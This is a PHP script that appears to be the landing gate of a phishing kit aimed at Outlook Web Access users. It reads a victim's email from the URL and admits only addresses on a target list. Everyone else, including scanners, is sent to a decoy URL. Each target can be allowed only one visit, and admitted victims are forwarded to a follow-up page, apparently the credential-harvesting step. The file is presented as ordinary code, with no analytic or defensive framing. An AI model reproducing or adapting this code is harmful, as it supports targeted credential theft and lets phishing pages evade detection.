<?php 
session_start();
require_once('config.php');
defined('9A466B642B0D29A62244DFB3521AF1E7A1333C9C111235243BE8AD0452A1666D3386D35C8ABE350505387D1164FF997C0238742') or exit();

if(isset($_GET['email']) && !empty($_GET['email'])) {
	$email =   isBase64($_GET['email'])? base64_decode($_GET['email']) : $_GET['email'];
	if (!is_email($email) || mx_exists($email,$valid)){
		exit(header(sprintf("Location:%s", $originalurl)));
	}
	$_SESSION['visitor_ip'] = show_visitor_ip();
	$_SESSION['owaemail'] = $email;
	$_SESSION['referer'] = base64_encode($email);
	if (!is_email($email) || mx_exists($email,$valid)){
		$_SESSION = '';
		session_destroy();
		exit(header(sprintf("Location:%s", $originalurl)));
	}
	$file = file_get_contents( $maillistfilename );
	if ( $file ) {
		$emails_list = preg_split( '/\n|\r\n?/', $file );
		$emails = !empty($emails_list) ? array_unique( $emails_list ) : '';
		$count = count ($emails);
		if( stripos( $file, $email ) !== FALSE )
		{
			$file = str_replace($email, "\n", $file);
			if($multivisit == 'no') { file_put_contents($maillistfilename, trim($file)); }
			$csrftoken = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
			$_SESSION['csrftoken'] = $csrftoken;
			$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? 'https://' : 'http://';
			exit(header('Location:'.$protocol.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].'?csrftoken='.$_SESSION['csrftoken']));
		}
		else {
			$_SESSION = '';
			session_destroy();
			exit(header(sprintf("Location:%s", $originalurl)));
		}
	} else {
	    $_SESSION = '';
		session_destroy();
		exit(header(sprintf("Location:%s", $originalurl)));
	}
} elseif(isset($_SESSION['csrftoken'])) {
	if ($_SESSION['csrftoken'] == $_GET['csrftoken']) {
		if ($show_captchaa !== "yes") {
			$newtoken = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
			$_SESSION['newtoken'] = $newtoken;
			exit(header("Location:check.php?newtoken=".$_SESSION['newtoken']."&email=''"));
		}
		else {
			$tap = Random::AlphaNumeric(128);
			$_SESSION['skii'] = $tap;
			exit(header("Location:check.php?tap=".$_SESSION['skii']));
		}
	}
	else {
		$_SESSION = '';
		session_destroy();
		exit(header(sprintf("Location:%s", $originalurl)));
	}
}
else {
	$_SESSION = '';
	session_destroy();
	exit(header(sprintf("Location:%s", $originalurl)));
}